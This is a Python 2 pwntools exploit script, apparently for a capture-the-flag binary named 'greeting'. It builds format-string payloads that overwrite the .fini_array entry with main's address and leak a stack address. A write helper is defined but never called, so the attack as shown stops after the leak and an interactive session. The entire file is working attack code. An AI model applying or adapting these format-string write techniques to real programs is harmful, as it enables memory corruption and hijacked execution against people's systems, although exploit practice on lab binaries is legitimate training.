#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level = "debug"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./greeting")
        self.offset = 12

    def start_binary(self):
        self.p = process(["./greeting"])
        self.p.recvuntil("name... ")

    def leak_stack(self):
        fini_array=self.e.get_section_by_name('.fini_array').header.sh_addr
        data_addr=self.e.get_section_by_name('.data').header.sh_addr
        main_addr=self.e.symbols['main']
        payload="AA"
        payload+=fmtstr_payload(offset=self.offset, writes={fini_array: main_addr}, numbwritten=20, write_size="short")
        payload+="%2$08x"
        print len(payload)

        self.p.sendline(payload)
        data = self.p.recvuntil("name...")
        data = data[-39:-31]
        print "[x] Leak stack address : "+data
        return int(data, 16)

    def write_sh(self, dest, src):
        payload="AA"
        payload+=fmtstr_payload(offset=self.offset, writes={dest: src}, numbwritten=20, write_size="short")
        self.p.sendline(payload)
        data = self.p.recvuntil("name...")
        data = data[-39:-31]
        print "[x] Leak stack address : "+data
        return int(data, 16)

    def pwn_binary(self):
        self.start_binary()

        stack_leak=self.leak_stack()

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
